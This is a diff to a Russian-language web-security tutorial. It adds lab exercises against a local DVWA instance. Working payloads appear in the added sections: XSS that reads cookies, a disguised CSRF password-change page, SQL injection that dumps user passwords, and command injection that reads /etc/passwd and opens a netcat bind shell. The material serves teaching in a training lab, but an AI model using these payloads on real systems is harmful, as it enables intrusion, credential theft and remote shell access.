@@ -87,6 +87,23 @@ of the last NTP clients or servers the instance has talked to.
 1. Отключаем команду `monlist`.
 1. Включаес фильтрацию входного траффика, т.к. внешний входящий запрос имеет ip адрес жертвы внутри сети.
 
+### Подготовка тестового примера
+
+Для демонстрации будем использовать
+сборку [Damn Vulnerable Web Application](https://app.vagrantup.com/mmckinst/boxes/dvwa)
+для [Vagrant](https://www.vagrantup.com/).
+
+```shell
+cd examaple
+# Запускаем Damn Vulnerable Web Application на порту VM 80 -> Host 8080
+vagrant up
+```
+
+Открываем браузер по адресу [http://localhost:8080](http://localhost:8080), вводим `admin`:`password`, переходим на
+вкладку `Setup / Reset DB` и нажимаем `Create / Reset Database`. Потом переходим во вкладку `DVWA Security` и выбираем
+уровень
+`low` -> `submit`.
+
 ### Main-In-The-Middle
 
 Атака посредника или атака Man in the middle (MITM) — вид атаки в криптографии, когда злоумышленник перехватывает и
@@ -170,7 +187,21 @@ XSS атаки – представляет собой уязвимость web-
 
 Если с приведённых примеров получился крестик, то `httрs://...ru/1.jpg` заменяем на адрес сниффера.
 
-Примеры взяты из [Xss для новичков](https://forum.antichat.ru/threads/20140/)
+Примеры взяты из [XSS для новичков](https://forum.antichat.ru/threads/20140/).
+
+Пример: переходим на вкладку `XSS (Reflected)`. Сайт берет данные из строки и без изменений подставляет в
+блок `echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';`.
+
+```javascript
+<script>alert(document.cookie)</script>
+```
+
+Переходим во вкладку `XSS (Stored)`. Сайт берет данные из поля message и в исходном виде вставляет в html страницу:
+
+```javascript
+<script>alert("Hello, world")</script>
+<iframe src="http://www.cnn.com"></iframe>
+```
 
 ### CSRF (Cross Site Request Forgery)
 
@@ -183,6 +214,22 @@ XSS атаки – представляет собой уязвимость web-
 Cookies.Спецификация протокола HTTP/1.1 определяет безопасные методы запросов, такие как GET, HEAD, которые не должны
 изменять данные на сервере. Для таких запросов, при соответствии сервера спецификации, нет необходимости применять
 защиту CSRF.
+
+Пример: переходим во вкладку `CSRF`, вводим новый пароль `admin` и видим что запрос на смену пароля уходит как GET
+запрос `http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change` и в запросе
+отправляются Cookie с сессией `PHPSESSID=eu5ebmk29rfl9g3rig10ljftr0`.
+
+Возьмем страницу [test.html](example/test.html) c кнопкой `Show kittens`, которая будет отправлять запрос на сервер со
+сменой пароля.
+
+```javascript
+function showKittens() {
+    const http = new XMLHttpRequest();
+    http.open("GET", "http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change");
+    http.send();
+    http.onload = () => console.log(http.responseText);
+}
+```
 
 ### CORS (Cross-origin resource sharing)
 
@@ -268,6 +315,32 @@ VALUES ('foo', 'bar'); --'
 тщательно фильтровать входные параметры, значения которых будут использованы для построения SQL-запроса. Так же все
 приходящие с формы параметры должны иметь соответствующий тип, т.е. если ожидается id сущности, то её тип должен быть
 int, а не string.
+
+Пример: переходим на вкладку `SQL Injection` и вводим следующие данные:
+
+```
+%' and 1=0 union select null, concat(user,':',password) from users #
+%' or '0'='0
+%' and 1=0 union select null, table_name from information_schema.tables #
+```
+
+Пример: command injection. Переходим во вкладку `Command Injection` и вводим следующие данные:
+
+```
+192.168.1.106; cat /etc/passwd
+```
+
+```
+192.168.1.106; mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
+```
+
+Подключаемся к localhost 4444 с локальной машины (порт 4444 проброшен из VM):
+
+```shell
+nc localhost 4444
+date
+whoami
+```
 
 ## HTTPS
 
